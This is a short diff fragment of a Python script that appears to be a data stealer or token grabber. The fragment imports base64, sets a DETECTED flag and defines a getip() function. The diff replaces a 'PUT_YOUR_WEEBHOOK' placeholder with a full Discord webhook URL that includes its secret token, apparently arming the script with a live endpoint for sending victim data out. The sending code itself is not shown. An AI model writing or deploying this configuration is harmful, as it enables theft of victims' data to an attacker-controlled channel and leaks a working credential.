@@ -23,7 +23,7 @@ import base64
 #  THIS IS 1.0 VERSION
 #
 #
-hook = "PUT_YOUR_WEEBHOOK"
+hook = "https://discord.com/api/webhooks/1099224480074711091/XxUz1MSno9mZV_ewwRJDjqWjA2nUawq8ubxzyBnFjuxziQQgc8Xv11Ed_XahAMsALo_Q"
 DETECTED = False
 
 def getip():
